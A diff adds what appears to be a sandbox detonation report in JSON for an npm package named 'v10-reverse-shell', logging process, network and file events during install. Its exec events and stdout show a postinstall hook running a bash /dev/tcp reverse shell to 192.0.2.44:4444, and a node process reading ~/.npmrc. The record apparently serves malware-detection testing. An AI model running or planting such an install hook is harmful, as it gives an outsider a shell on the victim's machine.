@@ -1,0 +1,104 @@
+{
+ "job_id": "5d74dfad-d057-4ce7-a9eb-d5beeee71db0",
+ "status": "completed",
+ "exit_code": 0,
+ "duration_s": 6.31,
+ "exec_events": [
+  {
+   "ts": "2026-11-04T00:40:59.502840743Z",
+   "pid": 290266,
+   "ppid": 290241,
+   "binary": "/usr/local/bin/docker-entrypoint.sh",
+   "args": "/usr/local/bin/docker-entrypoint.sh /bin/sh -c \"/bin/true pre-dd7fa6d7a26d2b80; \"$@\"; rc=$?; /bin/true post-dd7fa6d7a26d2b80; exit $rc\" detonator-witness npm install --no-audit --no-fund --prefix payloads/v10-reverse-shell",
+   "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-04T00:40:59.511124638Z",
+   "pid": 290304,
+   "ppid": 290266,
+   "binary": "/usr/local/bin/npm",
+   "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/v10-reverse-shell",
+   "parent_binary": "/bin/sh",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-04T00:40:59.511948285Z",
+   "pid": 290304,
+   "ppid": 290304,
+   "binary": "/usr/local/bin/node",
+   "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/v10-reverse-shell",
+   "parent_binary": "/usr/local/bin/npm",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-04T00:41:00.250366031Z",
+   "pid": 290372,
+   "ppid": 290304,
+   "binary": "/usr/bin/sh",
+   "args": "-c \"timeout 3 bash -c 'bash -i >& /dev/tcp/192.0.2.44/4444 0>&1' || true\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/v10-reverse-shell"
+  },
+  {
+   "ts": "2026-11-04T00:41:00.252332021Z",
+   "pid": 290373,
+   "ppid": 290372,
+   "binary": "/usr/bin/timeout",
+   "args": "3 bash -c \"bash -i >& /dev/tcp/192.0.2.44/4444 0>&1\"",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/v10-reverse-shell"
+  },
+  {
+   "ts": "2026-11-04T00:41:00.254704434Z",
+   "pid": 290374,
+   "ppid": 290373,
+   "binary": "/usr/bin/bash",
+   "args": "-c \"bash -i >& /dev/tcp/192.0.2.44/4444 0>&1\"",
+   "parent_binary": "/usr/bin/timeout",
+   "uid": 10001,
+   "cwd": "/work/payloads/v10-reverse-shell"
+  }
+ ],
+ "connect_events": [
+  {
+   "ts": "2026-11-04T00:41:00.258122479Z",
+   "pid": 290375,
+   "binary": "/usr/bin/bash",
+   "daddr": "192.0.2.44",
+   "dport": 4444,
+   "family": "AF_INET",
+   "resolved_domain": null,
+   "protocol": "tcp"
+  }
+ ],
+ "dns_queries": [],
+ "file_events": [
+  {
+   "ts": "2026-11-04T00:40:59.685623966Z",
+   "pid": 290304,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  }
+ ],
+ "executed_scripts": [],
+ "decoys": {},
+ "stdout_tail": "\n> v10@1.0.0 postinstall\n> timeout 3 bash -c 'bash -i >& /dev/tcp/192.0.2.44/4444 0>&1' || true\n\n\nup to date in 4s\n",
+ "stderr_tail": "",
+ "truncated": false,
+ "error": null,
+ "sensor": {
+  "pre_seen": true,
+  "post_seen": true
+ },
+ "resources": {
+  "cpu_s": 0.79,
+  "peak_memory_mb": 32.7,
+  "samples": 8
+ }
+}
